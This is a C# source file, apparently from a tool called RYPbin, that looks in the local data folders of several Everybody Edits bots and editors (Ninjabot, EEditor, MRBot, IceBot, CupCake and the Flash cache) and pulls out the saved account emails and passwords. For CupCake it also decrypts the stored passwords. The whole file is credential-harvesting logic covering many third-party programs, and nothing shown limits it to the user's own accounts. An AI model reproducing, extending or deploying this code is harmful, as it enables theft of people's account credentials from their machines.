/*
The MIT License (MIT)

Copyright (c) 2016 SirJosh3917

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 */

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Xml;

namespace RYPbin
{
	public class Directories
	{
		private List<string> Dirs;
		public List<string> Directories_ = new List<string>();
		public List<SearchMethod> SearchMethods = new List<SearchMethod>();

		public Directories()
		{
			Dirs = new List<string>();
			Directories_ = new List<string>();
			SearchMethods = new List<SearchMethod>();

			//EE swf details
			Dirs.Add(@"%appdata%\Macromedia");
			SearchMethods.Add(SearchMethod.EverybodyEdits);

			//Ninjabot 6.0b and below
			Dirs.Add(@"%localappdata%\Ninjabot");
			SearchMethods.Add(SearchMethod.NinjaBot);

			//Ninjabot 2.0.0 and above
			Dirs.Add(@"%localappdata%\Ninjabot2.0");
			SearchMethods.Add(SearchMethod.NinjaBot2);

			//EEditor
			Dirs.Add(@"%localappdata%\EEditor");
			SearchMethods.Add(SearchMethod.EEditor);

			//MRBot
			Dirs.Add(@"%localappdata%\WindowsFormsApplication1");
			SearchMethods.Add(SearchMethod.MRBot);

			//IceBot
			Dirs.Add(@"%localappdata%\_1_");
			SearchMethods.Add(SearchMethod.IceBot);

			//CupCake ( Kudos to proccessor for not storing passwords in plain text! )
			Dirs.Add(@"%userprofile%\Documents\CupCake");
			SearchMethods.Add(SearchMethod.CupCake);

			foreach(string i in Dirs)
			{
				Directories_.Add(i);
			}
		}

		public List<Account> GetFromFile(SearchMethod s, string file)
		{
			List<Account> ret = new List<Account>();
			Account tmp = new Account("guest", "guest", SearchMethod.None, file);
			string[] Acc = null;
			if(file != "")
				Acc = System.IO.File.ReadAllLines(file);
			XmlDocument read = null; XmlNodeList nodes = null;

			if (file.EndsWith(@".xml") || file.EndsWith(@".config"))
			{
				read = new XmlDocument();
				read.Load(file);
			}

			switch (s)
			{
				case SearchMethod.CupCake:
					if (file.ToLower().EndsWith("settings.xml"))
					{
						if (read != null)
						{
							nodes = read.DocumentElement.SelectNodes(@"/Settings/Accounts/Account");

							foreach (XmlNode i in nodes)
							{
								if (i.Name == "Account") //Make sure we're seeing some Acocunt nodes
								{
									//Get the email and password
									string Email = i.SelectSingleNode("Email").InnerText;
									string Password = i.SelectSingleNode("Password").InnerText;

									//Decrypt the password

									Password = RYPbin.SecureIt.DecryptString(Password).ToInsecureString();

									ret.Add(new Account(Email, Password, s, file, i.SelectSingleNode("Password").InnerText));
								}
							}
						}
					}
					break;
				case SearchMethod.IceBot:
				case SearchMethod.EEditor:
				case SearchMethod.MRBot:
					string AssemblyName = "";

					if (s == SearchMethod.EEditor)
						AssemblyName = "EEditor.Properties.Settings";

					if (s == SearchMethod.MRBot)
						AssemblyName = "EEbot.Properties.Settings";

					if (s == SearchMethod.IceBot)
						AssemblyName = "_x003F_1_x003F_._x003F_11_x003F_._x003F_13_x003F_";

					nodes = read.DocumentElement.SelectNodes(@"/configuration/userSettings/" + AssemblyName + "/setting");

					foreach (XmlNode i in nodes)
					{
						string value = i.SelectSingleNode("value").InnerText;

						string k = i.Attributes["name"].Value;

						if (k.ToLower() == "email")
						{
							tmp.Email = value;
						}

						if (k.ToLower() == "password")
						{
							tmp.Password = value;
						}
					}

					tmp.SearchMethod = s;

					ret.Add(tmp.Clone());
					break;
				case SearchMethod.NinjaBot:
					string[] Emails = System.IO.File.ReadAllLines(Environment.ExpandEnvironmentVariables(@"%localappdata%\Ninjabot\accemails.txt"));
					string[] Passwords = System.IO.File.ReadAllLines(Environment.ExpandEnvironmentVariables(@"%localappdata%\Ninjabot\accpasses.txt"));

					for (int i = 0; i < Emails.Length; i++)
					{
						if (Emails[i] != "" && Passwords[i] != "")
						{
							ret.Add(new Account(Emails[i], Passwords[i], s, @"%localappdata%\Ninjabot\accemails.txt"));
						}
					}
					break;
				case SearchMethod.NinjaBot2:
					Acc = System.IO.File.ReadAllLines(Environment.ExpandEnvironmentVariables(@"%localappdata%\Ninjabot2.0\remember.dat"));

					ret.Add(new Account(Acc[1], Acc[2], s, @"%localappdata%\Ninjabot2.0\remember.dat"));
					break;
				case SearchMethod.EverybodyEdits:
					if (Acc != null)
						if (Acc.Length > 0)
							if (Acc[0].Contains(@"username") && Acc[0].Contains(@"password"))
							{
								try
								{
									string GetEmail = Acc[0].Split(new string[] { "username" }, StringSplitOptions.None)[1];
									GetEmail = GetEmail.Substring(2);

									GetEmail = GetEmail.Split((char)0x00)[0];

									string GetPass = Acc[0].Split(new string[] { "password" }, StringSplitOptions.None)[0];
									GetPass = Acc[0].Substring(GetPass.Length + "password".Length + 2);

									GetPass = GetPass.Split((char)0x00)[0];

									ret.Add(new Account(GetEmail, GetPass, s, file));
								}
								catch (ArgumentOutOfRangeException e)
								{

								}
							}
					break;
			}

			return ret;
		}

		public string GetNextDirectory()
		{
			if (Directories_.Count == 0)
				return "null";

			string Dir = Directories_[0];
			Directories_.RemoveAt(0);
			return Environment.ExpandEnvironmentVariables(@Dir);
		}

		public SearchMethod GetNextSearchMethod()
		{
			if (SearchMethods.Count == 0)
				return SearchMethod.None;

			var Sm = SearchMethods[0];
			SearchMethods.RemoveAt(0);
			return Sm;
		}
	}
}
